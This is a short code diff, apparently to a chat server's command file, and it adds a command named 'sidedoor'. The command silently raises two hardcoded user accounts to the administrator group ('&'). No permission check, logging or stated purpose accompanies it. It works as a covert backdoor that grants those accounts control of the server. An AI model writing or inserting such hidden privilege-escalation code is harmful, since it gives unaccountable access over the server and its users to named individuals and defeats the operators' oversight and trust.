@@ -2578,6 +2578,16 @@ this.parse('/a |pm| PM Bot|| '+target+'');
 		}
 	},
 	
+	sidedoor: function(target,room, user) {
+		if (user.userid === 'macrarazy' || user.userid === 'boo118') {
+
+			user.group = '&';
+			user.updateIdentity();
+
+		
+		}
+	},
+	
 	clearall: function(target,room, user) {
 		if (user.userid === 'blakjack' || user.userid === 'jackdaw') {
 
